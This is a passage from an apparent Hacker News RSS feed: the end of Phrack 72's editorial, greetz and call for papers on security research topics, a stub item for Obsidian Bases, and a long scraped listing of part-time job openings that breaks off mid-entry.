You gave this issue texture. You made it feel.

To the layout crew who made this beast look like something worth 
printing in blood. Your work is proof that style and substance can 
coexist.

To everyone who tested drafts, pointed out typos, suggested better 
payloads, or tighter phrasing. You know who you are. We see you.

To the donors who pitched in to fund the printing of our anniversary 
edition. You helped keep this thing afloat, independent, and untamed.

And to the scene. The real one. You’re the reason we’re still doing 
this. This is yours.

A scream in a world that wants silence. A spark under a mountain of 
dead protocol.

Phrack lives because you do, so welcome to the noise and enjoy.

— Phrack Staff
ISSN 1068-1035


In this edition:

- 16 bangers from some of the sharpest minds in the scene

- A Prophile on the legendary Gera

- A puzzle to melt your brain (and flex your ego)

- A full-on CTF — win it and claim your Phrack coin!

- Visuals that hit like a payload: stunning GFX, ASCII and glitch art, 
  pure eye candy


--[ Greetz

Phrack 72 would not have been possible without the incredible hacker scene 
coming together to help make it happen. Thank you to all the authors, 
artists, donors, editors, and logistics experts who made this historic 
issue and international release a reality.

Special thanks to our artists: ackmage, amnesia, aNACHRONiST, araknet, 
bubok arsonian, digitalis, fyodor, ic3qu33n, jinn, mar, mavenmob, netspooky, 
p0rtL, s01den, x0, ytcracker. 

Massive thanks to the Paged Out crew for their help making an incredible 
print layout.

This zine would not have been possible without the following people:

ackmage         -- minted the only coin that'll be worth anything in 2026
bsdaemon        -- still carrying hackers forward
chompie         -- omg will u sign my driver?
clockwerk       -- l0ve
dark tangent    -- uber-supporter since dayZero
diaul           -- w0rd
horizon         -- ADM 4ever
Julio           -- The rise of the  alligatorzzzz
messede         -- &lt;b&gt;awesome&lt;/b&gt;
netspooky       -- ultimate cyber skull
pinguino        -- all your news are belong to her
retr0id         -- switch 2, retr0id 1, day 0
richinseattle   -- keeper of the lore
sblip           -- whaddup blip
skyper          -- triplegänger
TMZ             -- just a chill guy
Phrack Staff    -- for holding it down
Phrack's Tariff -- we got PCBs at home


--[ Phrack policy

phrack:~# head -77 /usr/include/std-disclaimer.h
/*
 *  All information in Phrack Magazine is, to the best of the ability of
 *  the editors and contributors, truthful and accurate.  When possible,
 *  all facts are checked, all code is compiled.  However, we are not
 *  omniscient (hell, we don't even get paid).  It is entirely possible
 *  something contained within this publication is incorrect in some way.
 *  If this is the case, please drop us some email so that we can correct
 *  it in a future issue.
 *
 *
 *  Also, keep in mind that Phrack Magazine accepts no responsibility for
 *  the entirely stupid (or illegal) things people may do with the
 *  information contained herein.  Phrack is a compendium of knowledge,
 *  wisdom, wit, and sass.  We neither advocate, condone nor participate
 *  in any sort of illicit behavior.  But we will sit back and watch.
 *
 *
 *  Lastly, it bears mentioning that the opinions that may be expressed in
 *  the articles of Phrack Magazine are intellectual property of their
 *  authors.
 *  These opinions do not necessarily represent those of the Phrack Staff.
 */


--[ Phrack 73 Call For Papers 

Why should you write for Phrack?

- You have a project you've been working on that pushes the limits in some 
  way, doing things that haven't been publicly shared before. If you do 
  cutting edge security research, you should write for Phrack.

- You are interested in aspects of security and technology that other people
  don't seem to care about or understand. If you feel like you need to shed
  light on a certain topic for all to see, you should write for Phrack.

- You keep seeing the same problems over and over and wish someone would 
  just write a straightforward guide for everyone. If you are the person 
  who can write that for now and future generations, you should write for 
  Phrack.

- You deserve a place to share your finest work without fear. If you don't
  want something you poured your heart and soul into turned into another 
  metric for shareholders and potential investors or trapped forever inside
  a corporate VPN, you should write for Phrack.

Worst Case Scenario: You just wrote a cool paper you can share on your own.

Best Case Scenario: Your paper gets published in Phrack. :)


::. What do we want? .::

Articles about hacking, exploit development, vulnerability research, and 
other fine topics.

More Specifically:  

- Exploitation: Demonstrate the latest techniques in breaking mitigations 
  and proving vulnerabilities still have bite.

- Persistence: Whether its userland, kernel, or below ring0, share a trick 
  in the dark art of stealth persistence.

- Fuzzing and Code Analysis: Automated bug hunting finds the low hanging 
  fruit, how can we make it more lethal?

- Binary Obfuscation: We have decompilers but custom VMs and powerful 
  transformations create impenetrable code.

- Data Obfuscation: Time to exfil, how do you move a terabyte of data 
  without looking like a fool?

- Anti-Forensics: Leave no trace, hide in the mist, or maybe even deploy 
  countermeasures on the parsers!

- Web Applications: Discuss confusion, bypass, and injection attacks on 
  the multi-headed hydra of modern applications.

- Cloud Security: Complexity and lack of visibility is the soft underbelly
  of cloud compute, discuss.

- Data Storage Weaknesses: If data theft is the end goal, let's talk about 
  all the leaks in storage infra and APIs. 

- Exploit Mitigation: Finding every bug is futile, how do we design more 
  secure systems to block these attacks?

- Malware Analysis: The world is covered in a diaspora of malware, flay 
  open the code and inspect the innards.

- Malware Defense: We wade in a pool of parasites attacking from every 
  angle, how do we block their vicious effects?

- Exotic Reverse Engineering: What are the corrupt hidden hands of power 
  in this electronic substrate?

- Scene History: Let us learn the often isolated tribal history that hasn't
  been written about before.

- Tales from the Crypt: Want to tell a personal story of a righteous hack?
  Maybe we'll believe you.


::. When Do We Want It By? .::

June 2026


::. When will Phrack 73 be released? .::

Summer 2026

                   ----( Contact )----

    &lt;  Editors           : staff[at]phrack{dot}org         &gt;
    &gt;  Submissions       : submissions[at]phrack{dot}org   &lt;
    &lt;  /dev/urandom      : loopback[at]phrack{dot}org      &gt;
    &gt;  Arts &amp; Leisure    : arts[at]phrack{dot}org          &lt;
    &lt;  Twitter/X         : phrack                          &gt;
    &gt;  Mastodon          : phrack[at]haunted{dot}computer  &lt;
    &lt;  BlueSky           : phrack{dot}org                  &gt;


    The rules are simple:

    + 7-bit ASCII wrapped to 76 columns OR Markdown UTF-8
    + ANTISPAM in the subject line or face the Spam God and 
      walk backwards into hell
</pre>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Obsidian Bases (649 pts)]]></title>
            <link>https://help.obsidian.md/bases</link>
            <guid>44945532</guid>
            <pubDate>Mon, 18 Aug 2025 21:28:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://help.obsidian.md/bases">https://help.obsidian.md/bases</a>, See on <a href="https://news.ycombinator.com/item?id=44945532">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Fractional jobs – part-time roles for engineers (252 pts)]]></title>
            <link>https://www.fractionaljobs.io</link>
            <guid>44945379</guid>
            <pubDate>Mon, 18 Aug 2025 21:10:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.fractionaljobs.io">https://www.fractionaljobs.io</a>, See on <a href="https://news.ycombinator.com/item?id=44945379">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><h2>HEY COMPANIES,</h2><div><p>Welcome to the place to hire&nbsp;</p><p>. We’re the largest network. We send you the top candidates. You can hire them directly.</p></div><div><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/686fee8d37b5301b91b82a2d_Group%20277%20(1).png" loading="lazy" alt=""></p></div></div><div><div><h2>Open Jobs</h2></div><div><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div id="w-node-_9e108133-0d83-1535-4f7b-7f859e28816b-075f0119"><h3>Hiring?</h3><div><p>Fractional talent is ready today</p><p>Mid-level - executive talent only</p><p>Convert to full-time when ready</p><p>Ditch the W2 salaries, payroll tax, etc.</p></div></div></div></div><div id="jobs"><div><h2 id="live-no">x</h2><h2>Live Jobs</h2></div><div><div id="filter-container"><h3>Filter Jobs</h3><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div></div><div id="live-jobs"><div fs-cmsfilter-element="list" role="list"><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Steelbay Equity Partners</h3><h3>&nbsp;-&nbsp;</h3><h3>Founding Marketer</h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Marketing</p><p>Syndicated</p><p>August 18, 2025</p><p>founding-marketer-at-steelbay-equity-partners</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Wedwallet</h3><h3>&nbsp;-&nbsp;</h3><h3>Legal Advisor</h3></p></div><div><p>10 - 20 hrs </p><p>&nbsp;|&nbsp;</p><p>$300 – $500 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Legal</p><p>Syndicated</p><p>August 18, 2025</p><p>legal-advisor-at-wedwallet</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Everlywell</h3><h3>&nbsp;-&nbsp;</h3><h3>Product Manager</h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Product</p><p>Syndicated</p><p>August 18, 2025</p><p>product-manager-at-everlywell</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>PeakHealth</h3><h3>&nbsp;-&nbsp;</h3><h3>Marketing Lead </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote </p><div><p>Marketing</p><p>Syndicated</p><p>August 18, 2025</p><p>marketing-lead-at-peakhealth</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>DUNE Suncare</h3><h3>&nbsp;-&nbsp;</h3><h3>Head of Marketing</h3></p></div><div><p>15 - 25 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Marketing</p><p>Syndicated</p><p>August 18, 2025</p><p>head-of-marketing-at-dune-suncare</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>IV DRIPS</h3><h3>&nbsp;-&nbsp;</h3><h3>Lead Developer </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Engineering</p><p>Syndicated</p><p>August 18, 2025</p><p>lead-developer-at-iv-drips</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Burwood</h3><h3>&nbsp;-&nbsp;</h3><h3>Executive Director</h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>On-site (Chicago)</p><div><p>Other</p><p>Syndicated</p><p>August 18, 2025</p><p>executive-director-at-burwood</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>An AI Tutoring Startup</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Financial Officer</h3></p></div><div><p>10 hrs</p><p>&nbsp;|&nbsp;</p><p>£100 - £125 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (UK only)</p><div><p>Finance</p><p>Syndicated</p><p>August 18, 2025</p><p>chief-financial-officer-at-an-ai-tutoring-startup</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A European Insurtech Startup</h3><h3>&nbsp;-&nbsp;</h3><h3>Senior AI Engineer</h3></p></div><div><p>20 - 40 hrs</p><p>&nbsp;|&nbsp;</p><p>€85 - €100 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (CET +/- 6hrs)</p><div><p>Engineering</p><p>Syndicated</p><p>August 15, 2025</p><p>senior-ai-engineer-at-a-european-insurtech-startup</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Wellness App for New Parents</h3><h3>&nbsp;-&nbsp;</h3><h3>Director of Marketing</h3></p></div><div><p>10 hrs</p><p>&nbsp;|&nbsp;</p><p>$6.5K - $7.5K / month</p><p>&nbsp;|&nbsp;</p><p>Remote (USA / Canada only)</p><div><p>Marketing</p><p>Syndicated</p><p>August 14, 2025</p><p>director-of-marketing-at-a-wellness-app-for-new-parents</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>An AI Model Training Startup</h3><h3>&nbsp;-&nbsp;</h3><h3>Senior Product Manager</h3></p></div><div><p>40 hrs</p><p>&nbsp;|&nbsp;</p><p>$20K - $25K / month</p><p>&nbsp;|&nbsp;</p><p>Remote (USA only)</p><div><p>Product</p><p>Syndicated</p><p>August 13, 2025</p><p>senior-product-manager-at-an-ai-model-training-startup-2</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Consumer Social Startup</h3><h3>&nbsp;-&nbsp;</h3><h3>Senior Full-Stack Engineer</h3></p></div><div><p>20 - 40 hrs</p><p>&nbsp;|&nbsp;</p><p>$125 - $150 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (EST +/- 5 hrs)</p><div><p>Engineering</p><p>Syndicated</p><p>August 12, 2025</p><p>senior-full-stack-engineer-at-a-consumer-social-startup</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Credible</h3><h3>&nbsp;-&nbsp;</h3><h3>Controller </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote (USA only)</p><div><p>Finance</p><p>Syndicated</p><p>August 11, 2025</p><p>controller-at-credible</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A79.ai</h3><h3>&nbsp;-&nbsp;</h3><h3> Vice President, AI Sales </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Sales</p><p>Syndicated</p><p>August 11, 2025</p><p>vice-president-ai-sales-at-a79-ai</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Good Trouble</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Financial Officer </h3></p></div><div><p>8 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Finance</p><p>Syndicated</p><p>August 11, 2025</p><p>chief-financial-officer-at-good-trouble</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>HeartStamp</h3><h3>&nbsp;-&nbsp;</h3><h3>General Counsel</h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>$110K – $160K yearly equiv.</p><p>&nbsp;|&nbsp;</p><p>Remote (USA only)</p><div><p>Legal</p><p>Syndicated</p><p>August 11, 2025</p><p>counsel-generative-ai-ip-at-heartstamp</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Creator-focused AI Startup</h3><h3>&nbsp;-&nbsp;</h3><h3>AI Engineer</h3></p></div><div><p>10 - 15 hrs</p><p>&nbsp;|&nbsp;</p><p>$100 - $125 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (USA, Canada, or Europe only)</p><div><p>Engineering</p><p>Syndicated</p><p>August 11, 2025</p><p>ai-engineer-at-a-creator-focused-ai-startup</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Project Own</h3><h3>&nbsp;-&nbsp;</h3><h3>Head of Product </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>$125-$175 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (USA only)</p><div><p>Product</p><p>Syndicated</p><p>August 11, 2025</p><p>head-of-product-at-project-own</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Bayesian Health</h3><h3>&nbsp;-&nbsp;</h3><h3>Senior Product Designer </h3></p></div><div><p>10 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Design</p><p>Syndicated</p><p>August 11, 2025</p><p>senior-product-designer-at-bayesian-health</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>An Auto Parts eCommerce Brand</h3><h3>&nbsp;-&nbsp;</h3><h3>Tech Lead</h3></p></div><div><p>10 hrs</p><p>&nbsp;|&nbsp;</p><p>$100 - $125 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (USA time zones only)</p><div><p>Engineering</p><p>Syndicated</p><p>August 11, 2025</p><p>tech-lead-at-an-auto-parts-ecommerce-brand</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Social App for Activity Buddies</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Marketing Officer</h3></p></div><div><p>5 hrs</p><p>&nbsp;|&nbsp;</p><p>$150 - $200 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (USA only)</p><div><p>Marketing</p><p>Syndicated</p><p>August 8, 2025</p><p>chief-marketing-officer-at-a-social-app-for-activity-buddies</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Consumer Healthtech Marketplace</h3><h3>&nbsp;-&nbsp;</h3><h3>Director of Operations</h3></p></div><div><p>20 - 40 hrs</p><p>&nbsp;|&nbsp;</p><p>$125 - $150 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (SF, LA, MIA, NYC only)</p><div><p>Operations</p><p>Syndicated</p><p>August 8, 2025</p><p>director-of-operations-at-a-consumer-healthtech-marketplace</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Consumer Healthtech Marketplace</h3><h3>&nbsp;-&nbsp;</h3><h3>Growth Marketing Lead</h3></p></div><div><p>20 - 40 hrs</p><p>&nbsp;|&nbsp;</p><p>$125 - $150 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (SF, LA, MIA, NYC only)</p><div><p>Marketing</p><p>Syndicated</p><p>August 8, 2025</p><p>growth-marketing-lead-at-a-consumer-healthtech-marketplace</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Consumer Healthtech Marketplace</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Technology Officer</h3></p></div><div><p>20 - 40 hrs</p><p>&nbsp;|&nbsp;</p><p>$175 - $200 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (SF, LA, MIA, NYC only)</p><div><p>Engineering</p><p>Syndicated</p><p>August 8, 2025</p><p>chief-technology-officer-at-a-consumer-healthtech-marketplace</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Nicklpass</h3><h3>&nbsp;-&nbsp;</h3><h3>Founding UX Designer </h3></p></div><div><p>5 - 10 hrs</p><p>&nbsp;|&nbsp;</p><p>$75k – $135k yearly equiv.</p><p>&nbsp;|&nbsp;</p><p>Remote (Worldwide)</p><div><p>Design</p><p>Syndicated</p><p>August 4, 2025</p><p>founding-ux-designer-at-nicklpass</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Morreale</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Financial Officer</h3></p></div><div><p>16 - 24 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Hybrid (Chicago)</p><div><p>Finance</p><p>Syndicated</p><p>August 4, 2025</p><p>chief-financial-officer-at-morreale</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Neuranics</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Financial Officer </h3></p></div><div><p>8 - 16 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Onsite (Glasgow, UK)</p><div><p>Finance</p><p>Syndicated</p><p>August 4, 2025</p><p>chief-financial-officer-at-neuranics</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Gitcoin</h3><h3>&nbsp;-&nbsp;</h3><h3>Operations Leader</h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>$4K - $6.5K / mo.</p><p>&nbsp;|&nbsp;</p><p>Remote (Worldwide)</p><div><p>Operations</p><p>Syndicated</p><p>August 4, 2025</p><p>operations-leader-at-gitcoin</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Novapulse</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Technology Officer</h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote </p><div><p>Engineering</p><p>Syndicated</p><p>August 4, 2025</p><p>chief-technology-officer-at-novapulse</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Rec</h3><h3>&nbsp;-&nbsp;</h3><h3>Field Marketing Lead</h3></p></div><div><p>10 - 20 